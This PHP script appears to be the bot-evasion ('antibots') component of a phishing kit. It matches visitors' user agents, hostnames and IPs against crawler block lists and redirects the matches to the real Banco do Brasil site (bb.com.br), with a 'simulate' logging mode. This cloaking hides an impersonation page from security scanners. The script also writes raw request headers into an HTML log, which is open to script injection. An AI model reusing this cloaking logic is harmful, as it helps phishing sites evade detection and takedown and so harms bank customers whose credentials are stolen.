<?php

$cfg["antibots"]["useragent_lock"] = "enabled";
$cfg["antibots"]["hostname_lock"] = "enabled";
$cfg["antibots"]["ip_lock"] = "enabled";
$cfg["general"]["bots_url"] = "https://bb.com.br";

function save_visitor_blocked($motivo,$param){
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $ipv4 = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ipv4);

    $content = "<tr><td>$ipv4</td><td>$user_agent</td><td>$hostname</td><td>$referer</td><td>$motivo</td><td>$param</td></tr>";

    file_put_contents("logs/blocked.log", $content, FILE_APPEND);
}

function save_visitor_simulate($motivo,$param){
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $ipv4 = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ipv4);

    $content = "<tr><td>$ipv4</td><td>$user_agent</td><td>$hostname</td><td>$referer</td><td>$motivo</td><td>$param</td></tr>";

    file_put_contents("logs/simulate.log", $content, FILE_APPEND);
}


function contains($needle, $haystack)
{
    return strpos($haystack, $needle) !== false;
}

$ip_blocked = NULL;

function blockUsers($ipAddresses) {
    $userOctets = explode('.', $_SERVER['REMOTE_ADDR']); // get the client's IP address and split it by the period character
    $userOctetsCount = count($userOctets);  // Number of octets we found, should always be four

    $block = false; // boolean that says whether or not we should block this user

    foreach($ipAddresses as $ipAddress) { // iterate through the list of IP addresses
        $octets = explode('.', $ipAddress);
        if(count($octets) != $userOctetsCount) {
            continue;
        }
        
        for($i = 0; $i < $userOctetsCount; $i++) {
            if($userOctets[$i] == $octets[$i] || $octets[$i] == '*') {
                continue;
            } else {
                break;
            }
        }
        
        if($i == $userOctetsCount) { // if we looked at every single octet and there is a match, we should block the user
            $block = true;

            global $ip_blocked;
            $ip_blocked = $ipAddress;

            break;
        }
    }
    
    return $block;
}
/*
	BLOCK BOTS - USER AGENT METHOD
*/

$active_agent = $_SERVER['HTTP_USER_AGENT'];

$blockAgents = file("block-bots/bad_bots_agents.php", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
unset($blockAgents[0]);
unset($blockAgents[1]);

foreach ($blockAgents as $agent) {
	if (contains($agent, $active_agent)){

        switch ($cfg["antibots"]["useragent_lock"]) {
            case 'enabled':
                save_visitor_blocked("USER_AGENT", $agent);
                header("Location: " . $cfg["general"]["bots_url"] , true ,301);
                exit();
                break;
            
            case 'simulate':
                @save_visitor_simulate("USER_AGENT", $agent);
                break;

            default:
                # code...
                break;
        }

        /*
        save_visitor_blocked("USER_AGENT", $agent);
        header("Location: " . $cfg["general"]["bots_url"] , true ,301);
		exit();
        */
	}
}

/*
	BLOCK BOTS - HOSTNAME METHOD
*/

$active_hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$blockHosts = file("block-bots/bad_bots_domains.php", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
unset($blockHosts[0]);
unset($blockHosts[1]);

foreach ($blockHosts as $host) {
	if (contains($host, $active_hostname)){

        switch ($cfg["antibots"]["hostname_lock"]) {
            case 'enabled':
                save_visitor_blocked("HOSTNAME", $host);
                header("Location: " . $cfg["general"]["bots_url"] , true ,301);
                exit();
                break;
            
            case 'simulate':
                @save_visitor_simulate("HOSTNAME", $host);
                break;

            default:
                # code...
                break;
        }

        /*
        save_visitor_blocked("HOSTNAME", $host);
		header("Location: " . $cfg["general"]["bots_url"] , true ,301);
		exit();
        */
	}
}
 
/*
	BLOCK BOTS - IP METHOD
*/

$blockAddresses = file("block-bots/bad_bots_ips.php", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
unset($blockAddresses[0]);
unset($blockAddresses[1]);
unset($blockAddresses[2]);

if(blockUsers($blockAddresses)) {

    switch ($cfg["antibots"]["ip_lock"]) {
        case 'enabled':
            save_visitor_blocked("IP", $ip_blocked);
            header("Location: " . $cfg["general"]["bots_url"] , true ,301);
            exit();
            break;
        
        case 'simulate':
            @save_visitor_simulate("IP", $ip_blocked);
            break;

        default:
            # code...
            break;
    }


    /*
    save_visitor_blocked("IP", $ip_blocked);
	header("Location: " . $cfg["general"]["bots_url"] , true ,301);
	exit();
    */
}
